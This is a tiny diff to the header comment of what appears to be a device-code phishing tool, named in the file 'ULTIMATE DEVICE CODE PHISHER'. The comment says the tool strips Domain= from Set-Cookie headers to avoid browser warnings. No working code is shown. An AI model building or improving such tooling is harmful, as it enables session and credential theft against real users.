@@ -1,4 +1,4 @@
-\// ============================================================
+// ============================================================
 // 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.10 – Cookie Domain Stripped
 // ============================================================
 // Strips Domain= from Set-Cookie headers to avoid browser warnings.
